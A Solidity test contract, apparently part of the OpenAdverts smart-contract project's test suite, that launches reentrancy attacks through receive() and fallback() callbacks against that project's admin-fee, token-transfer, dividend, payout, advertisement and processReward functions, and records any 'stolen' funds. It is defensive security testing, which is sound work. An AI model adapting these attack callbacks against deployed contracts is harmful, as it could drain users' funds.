// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "./libraries/LibOpenAdvertsPayoutStorage.sol";

// Add struct definitions before the interface
struct VerificationDataStruct {
    address affiliateReceivingAddress;
    address affiliateClaimInfoAddress;
    address advertismentContractAddress;
    uint256 nonce;
}

struct ThirdPartyAddressStruct {
    address thirdParty1;
    address thirdParty2;
    address thirdParty3;
}

interface IOpenAdvertsAdvertPOL {
    function processReward(
        bytes[] memory signatures,
        uint256[] memory blockNumbers,
        VerificationDataStruct memory verificationData,
        ThirdPartyAddressStruct[] memory thirdPartyAddresses
    ) external;
}

/**
 * @title MaliciousReentrancy
 * @dev This contract acts as a malicious actor attempting various reentrancy attacks
 * on the OpenAdverts Diamond contract system. It targets functions that:
 * 1. Transfer ETH/tokens and then update state
 * 2. Make external calls before state updates
 * 3. Have withdrawal patterns
 * 4. Handle affiliate/admin fee refunds
 */
contract MaliciousReentrancy {
    // Target contracts
    address public diamondAddress;
    address public targetContract;

    // Attack configuration
    uint256 public attackCount;
    uint256 public maxAttackDepth;
    bool public attackActive;

    // Attack type enumeration
    enum AttackType {
        ADMIN_FEE_REFUND, // Attack admin application fee refunds
        AFFILIATE_CREATION, // Attack affiliate creation process
        TOKEN_TRANSFER, // Attack token transfers with callbacks
        PAYOUT_WITHDRAWAL, // Attack payout withdrawals
        ADVERTISEMENT_REFUND, // Attack advertisement refunds
        GOVERNANCE_VOTING, // Attack governance voting mechanisms
        DIVIDEND_DISTRIBUTION // ✅ NEW: Attack dividend distribution directly
    }

    AttackType public currentAttackType;

    // Events for tracking attacks
    event AttackStarted(AttackType attackType, uint256 maxDepth);
    event AttackStep(uint256 step, string function_called);
    event AttackFailed(string reason);
    event AttackSucceeded(uint256 totalSteps);

    // Transfer attack specific events
    event TransferAttackStarted(address target, uint256 amount, uint256 initialBalance);
    event TransferReentrancyDetected(uint256 step, uint256 currentBalance, uint256 expectedBalance);
    event TransferAttackCompleted(uint256 stolenAmount, uint256 finalBalance);

    // ✅ NEW: Dividend attack specific events
    event DividendAttackStarted(address target, uint256 expectedAmount);
    event DividendReentrancyDetected(uint256 step, uint256 receivedAmount, uint256 totalReceived);
    event DividendAttackCompleted(uint256 totalDividends, uint256 attackAttempts);

    constructor() {
        maxAttackDepth = 5; // Prevent infinite recursion in tests
    }

    // Setup functions
    function setTargets(address _diamondAddress) external {
        diamondAddress = _diamondAddress;
        targetContract = _diamondAddress;
    }

    function setAttackDepth(uint256 _maxDepth) external {
        maxAttackDepth = _maxDepth;
    }

    // ========================================
    // ATTACK VECTOR 1: Admin Fee Refund Attack
    // ========================================
    function attackAdminFeeRefund(string memory storageId) external payable {
        currentAttackType = AttackType.ADMIN_FEE_REFUND;
        attackActive = true;
        attackCount = 0;

        emit AttackStarted(AttackType.ADMIN_FEE_REFUND, maxAttackDepth);

        try this.executeAdminApplication(storageId) {
            emit AttackSucceeded(attackCount);
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
        } catch {
            emit AttackFailed("Unknown error during admin fee attack");
        }
        attackActive = false;
    }

    function executeAdminApplication(string memory storageId) external payable {
        // Call the governance facet to apply as admin with excess fee
        (bool success, ) = diamondAddress.call{value: msg.value}(abi.encodeWithSignature("applyAsNewAdmin(string)", storageId));

        if (!success) {
            revert("Initial admin application failed");
        }

        emit AttackStep(attackCount, "applyAsNewAdmin");
    }

    // ATTACK VECTOR 2 (affiliate creation) removed: createProspectAffiliateContract is a pure
    // state-write behind the website-origin signature gate — no external-call/value reentrancy
    // surface, and the gate rejects any unsigned malicious-contract call before creation logic.

    // ========================================
    // ATTACK VECTOR 3: Token Transfer Attack
    // ========================================
    function attackTokenTransfer(address to, uint256 amount) external {
        currentAttackType = AttackType.TOKEN_TRANSFER;
        attackActive = true;
        attackCount = 0;

        // ✅ ADD: Initialize transfer attack variables
        transferTarget = to;
        transferAmount = amount;
        transferAttackPhase2 = false;
        stolenTokens = 0;

        emit AttackStarted(AttackType.TOKEN_TRANSFER, maxAttackDepth);

        // ✅ ADD: Get initial token balance
        (bool success, bytes memory data) = diamondAddress.call(abi.encodeWithSignature("balanceOf(address)", address(this)));

        if (success) {
            initialTokenBalance = abi.decode(data, (uint256));
            emit TransferAttackStarted(to, amount, initialTokenBalance);
        }

        try this.executeTokenTransfer(to, amount) {
            // ✅ ADD: Calculate stolen tokens after attack
            (bool balanceSuccess, bytes memory balanceData) = diamondAddress.call(abi.encodeWithSignature("balanceOf(address)", address(this)));

            if (balanceSuccess) {
                uint256 finalBalance = abi.decode(balanceData, (uint256));
                stolenTokens = finalBalance > initialTokenBalance ? finalBalance - initialTokenBalance : 0;
                emit TransferAttackCompleted(stolenTokens, finalBalance);
            }

            emit AttackSucceeded(attackCount);
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
        } catch {
            emit AttackFailed("Unknown error during token transfer attack");
        }
        attackActive = false;
    }

    function executeTokenTransfer(address to, uint256 amount) external {
        // Call the token facet transfer function
        (bool success, ) = diamondAddress.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));

        if (!success) {
            revert("Token transfer failed");
        }

        emit AttackStep(attackCount, "transfer");
    }

    // ========================================
    // ATTACK VECTOR 4: Payout Withdrawal Attack
    // ========================================
    function attackPayoutWithdrawal() external {
        currentAttackType = AttackType.PAYOUT_WITHDRAWAL;
        attackActive = true;
        attackCount = 0;

        emit AttackStarted(AttackType.PAYOUT_WITHDRAWAL, maxAttackDepth);

        try this.executePayoutWithdrawal() {
            emit AttackSucceeded(attackCount);
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
        } catch {
            emit AttackFailed("Unknown error during payout withdrawal attack");
        }
        attackActive = false;
    }

    function executePayoutWithdrawal() external {
        // Call the payout facet withdrawal function
        (bool success, ) = diamondAddress.call(abi.encodeWithSignature("withdrawDividends()"));

        if (!success) {
            revert("Payout withdrawal failed");
        }

        emit AttackStep(attackCount, "withdrawDividends");
    }

    // ========================================
    // ATTACK VECTOR 5: Advertisement Factory Attack
    // ========================================
    function attackAdvertisementCreation(string memory advertId, uint256 bountyAmount, uint256 maxBlockSeparation) external payable {
        currentAttackType = AttackType.ADVERTISEMENT_REFUND;
        attackActive = true;
        attackCount = 0;

        emit AttackStarted(AttackType.ADVERTISEMENT_REFUND, maxAttackDepth);

        try this.executeAdvertisementCreation(advertId, bountyAmount, maxBlockSeparation) {
            emit AttackSucceeded(attackCount);
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
        } catch {
            emit AttackFailed("Unknown error during advertisement attack");
        }
        attackActive = false;
    }

    function executeAdvertisementCreation(string memory advertId, uint256 bountyAmount, uint256 maxBlockSeparation) external payable {
        // Call the POL factory to create advertisement
        (bool success, ) = diamondAddress.call{value: msg.value}(
            abi.encodeWithSignature(
                "createNewProspectPOLAdvertContract(string,uint256,uint256,address[])",
                advertId,
                bountyAmount,
                maxBlockSeparation,
                new address[](0)
            )
        );

        if (!success) {
            revert("Advertisement creation failed");
        }

        emit AttackStep(attackCount, "createNewProspectPOLAdvertContract");
    }

    // ========================================
    // REENTRANCY ENTRY POINTS
    // ========================================

    // This function is called when the contract receives ETH
    receive() external payable {
        if (attackActive && attackCount < maxAttackDepth) {
            attackCount++;
            emit AttackStep(attackCount, "receive");

            // Track dividend payments
            if (msg.value > 0) {
                totalDividendsReceived += msg.value;
            }

            // Attempt reentrancy based on current attack type
            if (currentAttackType == AttackType.ADMIN_FEE_REFUND) {
                // Try to call admin application again
                (bool success, ) = diamondAddress.call{value: 0}(abi.encodeWithSignature("applyAsNewAdmin(string)", "reentrant-attack"));
                if (success) {
                    emit AttackStep(attackCount, "reentrancy-applyAsNewAdmin");
                }
            } else if (currentAttackType == AttackType.PAYOUT_WITHDRAWAL) {
                // Try to withdraw again
                (bool success, ) = diamondAddress.call(abi.encodeWithSignature("withdrawDividends()"));
                if (success) {
                    emit AttackStep(attackCount, "reentrancy-withdrawDividends");
                }
            } else if (currentAttackType == AttackType.TOKEN_TRANSFER) {
                // Get current balance to detect if we received unexpected tokens
                (bool success, bytes memory data) = diamondAddress.call(abi.encodeWithSignature("balanceOf(address)", address(this)));

                if (success) {
                    uint256 currentBalance = abi.decode(data, (uint256));
                    emit TransferReentrancyDetected(attackCount, currentBalance, initialTokenBalance);

                    // If this is a dividend payment (ETH received), try to transfer more tokens
                    if (msg.value > 0 && !transferAttackPhase2) {
                        transferAttackPhase2 = true;

                        // 🚨 ATTACK: Try to transfer tokens to another address while in reentrancy
                        (bool transferSuccess, ) = diamondAddress.call(
                            abi.encodeWithSignature("transfer(address,uint256)", transferTarget, transferAmount)
                        );

                        if (transferSuccess) {
                            emit AttackStep(attackCount, "reentrancy-transfer-success");

                            // ✅ ADD: Update stolen tokens count
                            (bool balanceSuccess, bytes memory balanceData) = diamondAddress.call(
                                abi.encodeWithSignature("balanceOf(address)", address(this))
                            );
                            if (balanceSuccess) {
                                uint256 newBalance = abi.decode(balanceData, (uint256));
                                if (newBalance > currentBalance) {
                                    stolenTokens += (newBalance - currentBalance);
                                }
                            }
                        }

                        // 🚨 ATTACK: Try to call distributeReward again
                        (bool dividendSuccess, ) = diamondAddress.call(abi.encodeWithSignature("distributeReward(address)", address(this)));

                        if (dividendSuccess) {
                            emit AttackStep(attackCount, "reentrancy-dividend-success");
                        }

                        // ✅ ADD: Try to manipulate voting during transfer
                        (bool voteSuccess, ) = diamondAddress.call(abi.encodeWithSignature("voteForNewAdmin(address,bool)", transferTarget, true));

                        if (voteSuccess) {
                            emit AttackStep(attackCount, "reentrancy-vote-manipulation");
                        }
                    }
                }
            } else if (currentAttackType == AttackType.ADVERTISEMENT_REFUND) {
                // Try to create another advertisement
                (bool success, ) = diamondAddress.call{value: 0}(
                    abi.encodeWithSignature(
                        "createNewProspectPOLAdvertContract(string,uint256,uint256,address[])",
                        "reentrant-advert",
                        1000000000000000000, // 1 ETH
                        100,
                        new address[](0)
                    )
                );
                if (success) {
                    emit AttackStep(attackCount, "reentrancy-createAdvertisement");
                }
            }
            // ✅ NEW: Dividend distribution reentrancy attack
            else if (currentAttackType == AttackType.DIVIDEND_DISTRIBUTION) {
                dividendAttackCount++;
                emit DividendReentrancyDetected(attackCount, msg.value, totalDividendsReceived);

                // If this is a dividend payment, try to claim dividends again
                if (msg.value > 0 && !dividendAttackPhase2) {
                    dividendAttackPhase2 = true;

                    // 🚨 ATTACK: Try to call distributeReward again while first call is still executing
                    (bool dividendSuccess, ) = diamondAddress.call(abi.encodeWithSignature("distributeReward(address)", address(this)));

                    if (dividendSuccess) {
                        emit AttackStep(attackCount, "reentrancy-distributeReward-success");
                    }

                    // 🚨 ATTACK: Try to manipulate dividend calculation
                    (bool calcSuccess, ) = diamondAddress.call(abi.encodeWithSignature("calculateDividend(address)", address(this)));

                    if (calcSuccess) {
                        emit AttackStep(attackCount, "reentrancy-calculateDividend-success");
                    }

                    // 🚨 ATTACK: Try to call transfer to trigger more dividends
                    (bool transferSuccess, ) = diamondAddress.call(abi.encodeWithSignature("transfer(address,uint256)", address(this), 1));

                    if (transferSuccess) {
                        emit AttackStep(attackCount, "reentrancy-transfer-for-dividends");
                    }
                }
            }
        }
    }

    // Fallback function for unexpected calls
    fallback() external payable {
        if (attackActive && attackCount < maxAttackDepth) {
            attackCount++;
            emit AttackStep(attackCount, "fallback");

            // ✅ ADD: Handle token transfer reentrancy in fallback too
            if (currentAttackType == AttackType.TOKEN_TRANSFER && !transferAttackPhase2) {
                transferAttackPhase2 = true;

                // Try to manipulate token state during fallback
                (bool success, ) = diamondAddress.call(abi.encodeWithSignature("transfer(address,uint256)", transferTarget, transferAmount / 2));

                if (success) {
                    emit AttackStep(attackCount, "fallback-reentrancy-transfer");
                }

                // Try to call undoVotes directly
                (bool undoSuccess, ) = diamondAddress.call(abi.encodeWithSignature("undoVotes(address,uint256)", address(this), transferAmount));

                if (undoSuccess) {
                    emit AttackStep(attackCount, "fallback-reentrancy-undoVotes");
                }
            }
        }
    }

    // ========================================
    // UTILITY FUNCTIONS
    // ========================================

    // Transfer attack specific variables
    address public transferTarget;
    uint256 public transferAmount;
    bool public transferAttackPhase2;
    uint256 public initialTokenBalance;
    uint256 public stolenTokens;

    // ✅ NEW: Dividend attack specific variables
    uint256 public dividendAttackCount;
    bool public dividendAttackPhase2;
    uint256 public expectedDividendAmount;
    uint256 public totalDividendsReceived;

    // Advanced transfer attack function
    function attackTokenTransferAdvanced(address to, uint256 amount, uint256 attempts) external {
        currentAttackType = AttackType.TOKEN_TRANSFER;
        attackActive = true;
        attackCount = 0;
        transferTarget = to;
        transferAmount = amount;
        transferAttackPhase2 = false;
        stolenTokens = 0;

        emit AttackStarted(AttackType.TOKEN_TRANSFER, maxAttackDepth);

        // Get initial balance
        (bool success, bytes memory data) = diamondAddress.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        if (success) {
            initialTokenBalance = abi.decode(data, (uint256));
        }

        // Perform multiple transfer attempts to trigger reentrancy
        for (uint256 i = 0; i < attempts && attackCount < maxAttackDepth; i++) {
            try this.executeTokenTransfer(to, amount) {
                emit AttackStep(attackCount, "repeated-transfer");
            } catch {
                // Continue with other attempts even if one fails
                emit AttackStep(attackCount, "failed-transfer-attempt");
            }
        }

        attackActive = false;

        // Calculate final results
        (bool balanceSuccess, bytes memory balanceData) = diamondAddress.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        if (balanceSuccess) {
            uint256 finalBalance = abi.decode(balanceData, (uint256));
            stolenTokens = finalBalance > initialTokenBalance ? finalBalance - initialTokenBalance : 0;
            emit TransferAttackCompleted(stolenTokens, finalBalance);
        }

        if (stolenTokens > 0) {
            emit AttackSucceeded(attackCount);
        } else {
            emit AttackFailed("No tokens stolen during reentrancy");
        }
    }

    // Get transfer attack results function
    function getTransferAttackResults()
        external
        view
        returns (uint256 _initialBalance, uint256 _stolenTokens, address _transferTarget, uint256 _transferAmount, bool _phase2Active)
    {
        return (initialTokenBalance, stolenTokens, transferTarget, transferAmount, transferAttackPhase2);
    }

    // ✅ NEW: Advanced dividend attack with multiple calls
    function attackDividendDistributionAdvanced(address targetAccount, uint256 attempts) external {
        currentAttackType = AttackType.DIVIDEND_DISTRIBUTION;
        attackActive = true;
        attackCount = 0;
        dividendAttackCount = 0;
        dividendAttackPhase2 = false;
        totalDividendsReceived = 0;

        emit AttackStarted(AttackType.DIVIDEND_DISTRIBUTION, maxAttackDepth);

        // Get expected dividend amount
        (bool success, bytes memory data) = diamondAddress.call(abi.encodeWithSignature("calculateDividend(address)", targetAccount));
        if (success) {
            expectedDividendAmount = abi.decode(data, (uint256));
        }

        // Perform multiple dividend distribution attempts
        for (uint256 i = 0; i < attempts && attackCount < maxAttackDepth; i++) {
            try this.executeDividendDistribution(targetAccount) {
                emit AttackStep(attackCount, "repeated-distributeReward");
            } catch {
                emit AttackStep(attackCount, "failed-dividend-attempt");
            }
        }

        attackActive = false;
        emit DividendAttackCompleted(totalDividendsReceived, dividendAttackCount);

        if (totalDividendsReceived > expectedDividendAmount) {
            emit AttackSucceeded(attackCount);
        } else {
            emit AttackFailed("No extra dividends obtained through reentrancy");
        }
    }

    // ========================================
    // ATTACK VECTOR 6: Dividend Distribution Attack
    // ========================================
    function attackDividendDistribution(address targetAccount) external {
        currentAttackType = AttackType.DIVIDEND_DISTRIBUTION;
        attackActive = true;
        attackCount = 0;
        dividendAttackCount = 0;
        dividendAttackPhase2 = false;
        totalDividendsReceived = 0;

        emit AttackStarted(AttackType.DIVIDEND_DISTRIBUTION, maxAttackDepth);

        // ✅ Calculate expected dividend amount before attack
        (bool success, bytes memory data) = diamondAddress.call(abi.encodeWithSignature("calculateDividend(address)", targetAccount));

        if (success) {
            expectedDividendAmount = abi.decode(data, (uint256));
            emit DividendAttackStarted(targetAccount, expectedDividendAmount);
        }

        try this.executeDividendDistribution(targetAccount) {
            emit DividendAttackCompleted(totalDividendsReceived, dividendAttackCount);
            emit AttackSucceeded(attackCount);
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
        } catch {
            emit AttackFailed("Unknown error during dividend distribution attack");
        }
        attackActive = false;
    }

    function executeDividendDistribution(address targetAccount) external {
        // Call the token facet distributeReward function
        (bool success, ) = diamondAddress.call(abi.encodeWithSignature("distributeReward(address)", targetAccount));

        if (!success) {
            revert("Dividend distribution failed");
        }

        emit AttackStep(attackCount, "distributeReward");
    }

    // ========================================
    // ATTACK VECTOR 7: ProcessReward Reentrancy Attack
    // ========================================
    function attackProcessReward(
        address polContract,
        bytes[] memory signatures,
        uint256[] memory blockNumbers,
        VerificationDataStruct memory verificationData,
        ThirdPartyAddressStruct[] memory thirdPartyAddresses
    ) external {
        currentAttackType = AttackType.PAYOUT_WITHDRAWAL;
        attackActive = true;
        attackCount = 0;

        emit AttackStarted(AttackType.PAYOUT_WITHDRAWAL, maxAttackDepth);
        emit AttackStep(attackCount, "attackProcessReward-starting");

        // ✅ TRACK: Record initial balance BEFORE attack
        uint256 balanceBeforeAttack = address(this).balance;

        IOpenAdvertsAdvertPOL pol = IOpenAdvertsAdvertPOL(polContract);

        try pol.processReward(signatures, blockNumbers, verificationData, thirdPartyAddresses) {
            emit AttackStep(attackCount, "processReward-executed");

            // ✅ CHECK: Did we actually steal funds?
            uint256 balanceAfterAttack = address(this).balance;
            uint256 fundsStolen = balanceAfterAttack > balanceBeforeAttack ? balanceAfterAttack - balanceBeforeAttack : 0;

            if (fundsStolen > 0) {
                // ✅ REAL SUCCESS: We actually stole funds through reentrancy
                emit AttackSucceeded(attackCount);
                emit AttackStep(attackCount, string(abi.encodePacked("FUNDS STOLEN: ", _toString(fundsStolen), " wei")));
            } else {
                // ❌ NO THEFT: Function executed but we didn't steal anything
                emit AttackFailed("processReward executed but no funds stolen - nonReentrant protection worked");
            }
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
            revert(reason);
        } catch (bytes memory) {
            emit AttackFailed("Low-level call failed");
            revert("Low-level call failed");
        }
        attackActive = false;
    }

    // ✅ ADD: Helper function to convert uint256 to string
    function _toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    // (Removed duplicate struct definitions to fix type mismatch error)

    // ========================================
    // UTILITY FUNCTIONS
    // ========================================

    function resetAttack() external {
        attackActive = false;
        attackCount = 0;
    }

    function getAttackStatus() external view returns (bool active, uint256 count, AttackType attackType) {
        return (attackActive, attackCount, currentAttackType);
    }

    // Function to withdraw any ETH sent to this contract for testing
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Function to check contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    // Get dividend attack results
    function getDividendAttackResults()
        external
        view
        returns (uint256 _expectedAmount, uint256 _totalReceived, uint256 _attackCount, bool _phase2Active)
    {
        return (expectedDividendAmount, totalDividendsReceived, dividendAttackCount, dividendAttackPhase2);
    }
}
